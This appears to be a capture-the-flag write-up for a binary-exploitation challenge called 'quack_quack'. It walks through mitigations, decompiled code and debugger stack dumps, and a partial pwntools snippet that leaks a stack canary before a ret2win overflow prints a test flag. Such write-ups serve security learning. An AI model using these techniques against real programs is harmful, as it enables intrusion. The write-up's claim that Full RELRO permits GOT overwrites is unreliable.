# Description

On the quest to reclaim the Dragon's Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it's time to face the Duck!
(upsolve :( banyak kerjaan njir)

# Analisys

first time off all, we must first check the binary using checksec to find out all the mitigations that are in binary.
like this

```
└─$ pwn checksec quack_quack
[*] '/home/ilupii/htb/cyber_apocalypse/challenge/quack_quack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

as we can see the canary on it mean it is diffcult to perform ROP because there is a random byte before RIP is executed. Full relro mean it we can overwrite the GOT(Global Offset Table) and no pie it mean no address randomization in binary..

## Dissassembly

start with main function

```
undefined8 main(void)

{
  long lVar1;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  duckling();
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

as we can see the main function just call ducking();

```
void duckling(void)

{
  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0,&local_88,0x66);
  pcVar1 = strstr((char *)&local_88,"Quack Quack ");
  if (pcVar1 == (char *)0x0) {
    error("Where are your Quack Manners?!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ",pcVar1 + 0x20);
  read(0,&local_68,0x6a);
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

wee can see here in there our first input and we get a leak of `pcVar1 + 0x20` that means we can leak up to 0x20 from the end of the buffer where the string `Quack Quack ` is found in our input string. Luckily, we see that we can leak the `canary` address at such offset. After that, we can overflow the second buffer and perform a `ret2win`. There is a function called `duck_attack` that prints the flag.

```

void duck_attack(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_15;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_14 = open("./flag.txt",0);
  if (local_14 < 0) {
    perror("\nError opening flag.txt, please contact an Administrator\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_14,&local_15,1);
    if (sVar1 < 1) break;
    fputc((int)local_15,stdout);
  }
  close(local_14);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


```

now, to make sure all the above analysis is correct is debugging

i set break point on duckling+238 or after first read to see the canary where is 

```
pwndbg> x/20gx $rsp
0x7fffffffd750: 0x0000000000000000      0x0000000000000000
0x7fffffffd760: 0x4242424241414141      0x000000000000000a // input 0x10
0x7fffffffd770: 0x0000000000000000      0x0000000000000000 // 0x20
0x7fffffffd780: 0x0000000000000000      0x0000000000000000 // 0x30
0x7fffffffd790: 0x0000000000000000      0x0000000000000000 // 0x40
0x7fffffffd7a0: 0x0000000000000000      0x0000000000000000 // 0x50
0x7fffffffd7b0: 0x0000000000000000      0x0000000000000000 // 0x60
0x7fffffffd7c0: 0x0000000000000000      0x0000000000000000 // 0x70
0x7fffffffd7d0: 0x00007ffff7fa9600      0x7de39dcfc9f2c400 // 0x80
0x7fffffffd7e0: 0x00007fffffffd800      0x000000000040162a
```

we can see the canary lies at `0x80` from the input buffer. As we can leak up to 0x20 bytes, and we can leak the canary address (7 bytes and adding the last 0 due to `read`) at `0x71`

```
>>> 0x71 - len('Quack Quack ')
101
>>> hex(101)
'0x65'
------------------------------------------------------------
python

p.sendlineafter(b'> ',b'A'*(0x65 - len('Quack Quack ')) + b'Quack Quack ')
p.recvuntil(b'Quack Quack ')
a = u64(p.recv(7).rjust(8,b'\x00'))
print("canary",hex(a))
```

run it the exploit to see the canary like this 

```
└─$ python3 e.py
[*] '/home/ilupii/htb/cyber_apocalypse/challenge/src/quack_quack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/ilupii/htb/cyber_apocalypse/challenge/src/quack_quack': pid 2857
canary 0x2af35652a4966100
```

after leak the canary we can setup `ret2win` to print the flag

we set debuging break in duckling+319 in after second read 

```
pwndbg> x/20gx $rsp
0x7fffffffd740: 0x0000000000000002      0x00007fffffffd750
0x7fffffffd750: 0x7551206b63617551      0x0000000a206b6361
0x7fffffffd760: 0x0000000000000000      0x0000000000000000
0x7fffffffd770: 0x4242424241414141      0x0000000a43434343 // input 0x10
0x7fffffffd780: 0x0000000000000000      0x0000000000000000 // 0x20
0x7fffffffd790: 0x0000000000000000      0x0000000000000000 // 0x30
0x7fffffffd7a0: 0x0000000000000000      0x0000000000000000 // 0x40
0x7fffffffd7b0: 0x0000000000000000      0x0000000000000000 // 0x50
0x7fffffffd7c0: 0x00007ffff7fa9600      0x44e442149b25dd00 // 0x60
0x7fffffffd7d0: 0x00007fffffffd7f0      0x000000000040162a
```

We see that the `canary` is at `0x58` bytes from the start of the second buffer. Then a dummy address and then the `return address`. Knowing all this and the address of `duck_attack()`, we can craft our exploit.

# Solution

```
[*] '/home/ilupii/htb/cyber_apocalypse/challenge/src/quack_quack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process '/home/ilupii/htb/cyber_apocalypse/challenge/src/quack_quack': pid 3032
canary 0x7d3cd87ced9d5200
[*] Switching to interactive mode
\xf0\xe6;\xea\xfd\x7f, ready to fight the Duck?

> Did you really expect to win a fight against a Duck?!

HTB{f4k3_fl4g_4_t35t1ng}
[*] Got EOF while reading in interactive
$
```


